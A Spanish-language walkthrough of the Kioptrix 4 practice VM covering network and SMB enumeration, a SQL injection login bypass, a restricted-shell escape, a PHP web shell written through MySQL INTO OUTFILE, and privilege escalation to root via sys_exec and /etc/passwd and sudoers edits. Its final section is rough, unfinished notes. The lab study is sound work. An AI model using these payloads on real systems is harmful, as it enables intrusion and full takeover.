Esta máquina solo tenia un archivo `.vmdk`, lo que se tuvo que hacer, fue crear una nueva máquina virtual desde cero con Ubuntu-64bits y reemplazar el archivo `.vmdk` creado, por el descargado.
En las configuraciones lo dejamos en modo breach para obtener una IP.

Tiramos un escaneo usando el nombre de la interfaz de la máquina atacante:

```js
$sudo arp-scan -I wlp2s0 --localnet
[...]
192.168.0.69	00:0c:29:49:7d:d8	VMware, Inc.
```

Hacemos un ping, para un primer reconocimiento:
```js
$ping -c 1 192.168.0.69
PING 192.168.0.69 (192.168.0.69) 56(84) bytes of data.
64 bytes from 192.168.0.69: icmp_seq=1 ttl=64 time=10.1 ms
```
Dado el TTL sabemos que es un sistema linux, realizamos un escaneo para ver los puertos disponibles de la máquina víctima:
```js
$sudo nmap -p- -Pn -n -T3 192.168.0.69
[...]
Nmap scan report for 192.168.0.69
[...]
Not shown: 39528 closed tcp ports (reset), 26003 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```
Obtenemos de información que hay 39528 cerrados, 26003 filtrados, 4 abiertos, da un total de 65535 puertos, es decir contemplamos todos.

Para obtenrmás información delos puertos abiertos, hacemos un segundo escaneo con nmap.
```js
$sudo nmap -p22,80,139,445 -sSCV -Pn -n 192.168.0.69
[...]

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   [...]
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
[...]

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2025-05-13T11:26:20-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -4h02m21s, deviation: 2h49m43s, median: -6h02m22s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

Al parecer podemos comenzar con el servidor Samba 3.0.28asmb.
Verificando la vulnerabilidad:
```js
$nmap --script vuln -p 445 192.168.0.69
[...]

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
```

Como en este caso no aparecieron vulnerabilidades específicas, pero es casi seguro que existen, seremos más incisivos en este puerto. El primer escaneo de puertos lanzó el script: `smb-os-discovery` y `smb-security-mode`

```js
$ls /usr/share/nmap/scripts | grep smb
[]..
smb-enum-domains.nse
smb-enum-groups.nse
smb-enum-processes.nse
smb-enum-services.nse
smb-enum-sessions.nse
smb-enum-shares.nse
smb-enum-users.nse
```

```js
$nmap --script "smb-enum-domains" -sC 192.168.0.69
[...]
Host script results:
| smb-enum-domains: 
|   Builtin
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|     Account lockout disabled
|   KIOPTRIX4
|     Groups: n/a
|     Users: nobody\x00, robert\x00, root\x00, john\x00, loneferret\x00
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|_    Account lockout disabled
```

El script `smb-enum-domains` lista dominios, usuarios y políticas de contraseñas accesibles por SMB en este caso en el puerto 445.
¿Qué es Builtin? Es un dominio interno  por defeult, donde están los grupos y usarios por defecto de un sistema.
En este caso no se enumeraron grupos ni usuarios,pero sí dice que su política de contraseñas es de mínimo 5 carácteres y que el bloque tras intentos fallidos está deshabilitado.
Sabiendo esto, podemos hacer el reconocimiento del dominio KIOPTRIX4, del cual, el comando mostró 5 usuarios.
Sobre las políticas de contraseñas dice lo mismo que Builtin.
Agregamos `192.168.0.69    KIOPTRIX4` como linea al archivo `/etc/hosts`

Siguiendo con el reconocimiento, buscaremos enumerar los recursos compartidos por smb:
```js
$nmap -p445 --script "smb-enum-shares" -sC 192.168.0.69
[...]

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\192.168.0.69\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Kioptrix4 server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.168.0.69\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

El script `smb-enum-shares` enumera los recursos compartidos como habíamos dicho, pero usa la cuenta que tenemos `guest`, es decir, simulamos un acceso anónimo.
Podemos ver algo inusual; IPC$ normalmente no comparte archivos, se usa para la comunicación de procesos, pero el `READ/WRITE` indica acceso (como si se utilizara para archivos). Cosa que no pasa con print$.

Con esta carpeta mal configurada, tenemos un posible vector de ataque.
Sigamos con el reconocimiento,hay un puerto 80 esperando...

En un primer reconocimiento, podemos intuir que se trata de un login:
```python
$whatweb http://192.168.0.69
http://192.168.0.69 [200 OK] Apache[2.2.8], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch], IP[192.168.0.69], PHP[5.2.4-2ubuntu5.6][Suhosin-Patch], PasswordField[mypassword], X-Powered-By[PHP/5.2.4-2ubuntu5.6]
```

Con el payload `' or 1=1#` en ambos campos, obtuvimos esto:
```html
User \'or 1=1<br><br>

Oups, something went wrong with your member's page account.<br>
Please contact your local Administrator<br>
to fix the issue.<br>
<form method="link" action="index.php">
<input type=submit value="Back"></form>
```

Con esta respuesta, vemos que quieren saltar el cracter comilla `'`, y que el caracter octothorpe no se considera. es decir que si baipaseamos la escapada de la comilla, podemos obtener algo.

Con las pruebas vemos que la escapada aplica al nombre de usuario, si usamos robert con `1' or '1'='1` y obtenemos esto:
```html
<tr><td width="30">Username</td>
	<td width="464">robert</td>
</tr>
<tr>
    <td width="30">Password</td>
	<td width="464">ADGAdsafdfwt4gadfga==</td>
</tr>
```

También con el usuario `john`, obtuvimos tambien su contraseña:
```html
<tr><td width="30">Username</td>
	<td width="464">john</td>
</tr>
<tr>
    <td width="30">Password</td>
	<td width="464">MyNameIsJohn</td>
</tr>
```

Con esta contraseña, que no esta cifrada aunque lo parezca tenemos acceso, pero limitado:
```python
$ssh robert@192.168.0.69
[...]
robert@192.168.0.69's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
robert:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
```

find / -type d -perm /u=w,g=w,o=w 2>/dev/null

Con este usuario `robert` no obtuvimos nada con la shel restringida, pero es muy sencillo baipasearla.
```python
robert:~$ $(echo "cd /tmp")
robert:~$ echo !$
!$
robert:~$ cd $(echo '/tmp')
*** forbidden syntax -> "cd $(echo '/tmp')"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
robert:~$ echo os.system('/bin/bash')
robert@Kioptrix4:~$
```

Buscamos directorios donde el usuario `robert` pueda escribir:
```python
robert@Kioptrix4:~$ find / -type d -perm /u=w,g=w,o=w 2>/dev/null
[...]
/mnt
/home
/home/robert
/home/john
/home/loneferret
/var
[...]
/var/www
/var/www/images
/var/www/robert
/var/www/john
[...]
/etc
[...]
/etc/cron.daily
/etc/mysql
/etc/mysql/conf.d
[...]
/tmp
/tmp/.winbindd
/root
/root/.ssh
/root/lshell-0.9.12
```

En `/root/lshell-0.9.12` está el script que da la shell restringida, inspeccionando el código, la configuración está en `/root/lshell-0.9.12/etc/lshell.conf`. Podemos hacer nuestro propio `lshell.conf` con cambios como:
```python
[default]
allowed         : ['ls','echo','cd','ll','sudo','bash','whoami']
forbidden       : []
sudo_commands   : ['bash']
```

El problema es que no podemos borrar el archivo actual, ni modificarlo.

Por otro lado en `/var/www` revisamos los archivos php
```python
robert@Kioptrix4:/var/www$ ls -l
total 36
-rw-r--r-- 1 root root 1477 Feb  6  2012 checklogin.php
-rw-r--r-- 1 root root  298 Feb  4  2012 database.sql
drwxr-xr-x 2 root root 4096 Feb  6  2012 images
-rw-r--r-- 1 root root 1255 Feb  6  2012 index.php
drwxr-xr-x 2 root root 4096 Feb  4  2012 john
-rw-r--r-- 1 root root  176 Feb  4  2012 login_success.php
-rw-r--r-- 1 root root   78 Feb  4  2012 logout.php
-rw-r--r-- 1 root root  606 Feb  6  2012 member.php
drwxr-xr-x 2 root root 4096 Feb  4  2012 robert
```



```
robert@Kioptrix4:/var/www$ cat database.sql 
CREATE TABLE `members` (
`id` int(4) NOT NULL auto_increment,
`username` varchar(65) NOT NULL default '',
`password` varchar(65) NOT NULL default '',
PRIMARY KEY (`id`)
) TYPE=MyISAM AUTO_INCREMENT=2 ;

-- 
-- Dumping data for table `members`
-- 

INSERT INTO `members` VALUES (1, 'john', '1234');

```


```
robert@Kioptrix4:/var/www$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 64
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| members            | 
| mysql              | 
+--------------------+
3 rows in set (0.00 sec)
```

Usando igual root, hacemos un tipo de inyección, con select ... into outfile
```
robert@Kioptrix4:/var/www$ mysql -u root        
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 66
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/checklogin.php';
ERROR 1086 (HY000): File '/var/www/checklogin.php' already exists
mysql> SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/shell.php';     
Query OK, 1 row affected (0.00 sec)

mysql> exit
Bye
robert@Kioptrix4:/var/www$ ls
checklogin.php  database.sql  images  index.php  john  login_success.php  logout.php  member.php  robert  shell.php
```

```
http://192.168.0.69/shell.php?cmd=whoami
```

```
$openssl passwd -1 -salt alexi alexi
$1$alexi$eGNWFfBkUjcEpDg87R5OV1
```

```
alexi:$1$alexi$eGNWFfBkUjcEpDg87R5OV1:0:0:root:/root:/bin/bash


SELECT "alexi:$1$alexi$eGNWFfBkUjcEpDg87R5OV1:0:0:root:/root:/bin/bash" INTO OUTFILE '/etc/passwd';



SELECT "robert ALL=(ALL) NOPASSWD:ALL" INTO OUTFILE "/etc/sudoers.d/robert";

echo "robert ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/robert



mysql> SELECT "robert ALL=(ALL) NOPASSWD:ALL" INTO OUTFILE "/etc/sudoers.d/robert";
ERROR 1 (HY000): Can't create/write to file '/etc/sudoers.d/robert' (Errcode: 2)

mysql> select sys_exec('usermod -aG admin robert');
+--------------------------------------+
| sys_exec('usermod -aG admin robert') |
+--------------------------------------+
| NULL                                 | 
+--------------------------------------+
1 row in set (0.05 sec)

mysql> exit
Bye
robert@Kioptrix4:/var/www$ sudo su
[sudo] password for robert: 
root@Kioptrix4:/var/www# id
uid=0(root) gid=0(root) groups=0(root)





```



